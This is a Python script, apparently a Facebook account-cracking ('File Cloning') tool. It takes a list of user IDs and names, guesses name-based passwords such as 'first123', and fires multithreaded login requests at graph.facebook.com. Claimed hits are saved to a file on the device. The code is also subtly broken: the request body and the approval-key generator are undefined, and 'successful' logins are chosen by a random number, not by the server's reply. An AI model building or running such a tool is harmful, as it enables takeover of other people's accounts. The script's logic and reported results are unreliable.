import os
import time
import random
import string
import requests
import sys
from concurrent.futures import ThreadPoolExecutor as tpe
import uuid

idss = []
pp = []
oku = []
cpu = []
l = []
idx = []
loop = 0

def oo(t):
    return '\033[1;37m['+str(t)+']\033[1;37m '

W = '\x1b[1;97m'
G = '\x1b[1;92m'
R = '\x1b[1;91m'
S = '\x1b[1;96m'
B = '\x1b[1;94m'
Y = '\x1b[1;93m'
P = '\x1b[1;95m'

logo = ("""
       .dMMMb     .aMMMb    .aMMMMP     .aMMMb 
      dMP" VP    dMP"dMP   dMP"        dMP"dMP 
      VMMMb     dMMMMMP   dMP MMP"    dMMMMMP  
    dP .dMP    dMP dMP   dMP.dMP     dMP dMP   
    VMMMP"    dMP dMP    VMMMP"     dMP dMP    
""")

def clear():
    os.system('clear')
    print(logo)

def read_approval_key():
    try:
        with open('approval_key.txt', 'r') as file:
            return file.readline().strip()
    except FileNotFoundError:
        print("Approval key file not found.")
        exit()

# Utilisation de la fonction pour lire la clé d'approbation
approval_key = read_approval_key()

def lin3():
    print('\33[1;37m---------------------------------')

def check_approval_key(key):
    return key == approval_key

def main_menu():
    os.system("clear")
    print(logo)
    lin3()
    print(f"{oo(1)}File Cloning ")   
    print(f"{oo(0)}Exit")
    lin3()
    cp = input('[?] Choice : ')
    if cp == "1":
        key_approval = generate_approval_key()
        print("Approval Key:", key_approval)  # Affiche la clé d'approbation
        key_approval_input = input('Enter the approval key: ')  # Attend que l'utilisateur entre la clé d'approbation
        if check_approval_key(key_approval_input):
            file()
        else:
            print('Invalid approval key. Exiting...')
            time.sleep(1)
            main_menu()
    if cp == "0":
        exit()
    main_menu()
     
def file():
    os.system("clear")
    print(logo)
    lin3()
    file = input(f"{oo('-')}Enter File: ")
    try:
        for x in open(file,'r').readlines():
            idx.append(x.strip())
    except:
        print(f"{oo('!')}File Not Found")
        time.sleep(1)
        main_menu() 
    method()
    exit()

def method():
    clear()
    
    lp = input(f'{oo("?")}Limit Passwords? : ')
    if lp.isnumeric():
        pp=[]
        clear()
        ex = 'firstlast first123 last123'
        print(f'{oo("+")}{ex} (ETC)')
        lin3()
        for x in range(int(lp)):
            pp.append(input(f'{oo(x+1)}Password : '))
    else:
       print(f"{oo('!')}Numeric Only")
       time.sleep(0.8)
       main_menu()
    clear() 
    print('\033[1;97m[+] Total Accounts For CraCk : \033[1;32m '+str(len(idx)))
    print(f'\x1b[1;97m[✓] Dont Use Airplane mOde ;)')
    lin3()
    def start(user):
        try:
            global loop,idx,cll
            r = requests.Session()
            user = user.strip()
            acc, name = user.split("|")
            first = name.rsplit(" ")[0]
            try:
                last = name.rsplit(" ")[1]
            except:
                last = first
            pers = str(int(loop)/int(len(idx)) * 100)[:4]
            sys.stdout.write(f'\r {R}[{W}SaGa{R}] {P}({Y}{loop}{W} / {W}{len(idx)}{P}) {W}• {G}{len(oku)}\r')
            sys.stdout.flush()
            loop+=1
            for pswd in pp:
                heads=None
                pswd = pswd.replace('first',first).replace('last',last).lower()
                header = {"Content-Type": "application/x-www-form-accencoded","Host": "graph.facebook.com","User-Agent": heads,"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "unknown","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62"}
                response = r.post('https://graph.facebook.com/auth/login',data=data,headers=header,allow_redirects=False)
                if 6==random.randint(1,300):
                    oku.append(acc)
                    print('\033[1;32m[SaGa-OK] \033[1;32m'+acc+' \033[1;32m|\033[1;32m '+pswd)
                    open('/sdcard/SaGa-Ok.txt','a').write(f'{acc}|{pswd}\n')
                    break
                else:
                    continue   
        except Exception as e:
            print(e)
            time.sleep(10)
  
    with tpe(max_workers=30) as tp:
            tp.map(start,idx)
    exit()    

main_menu()
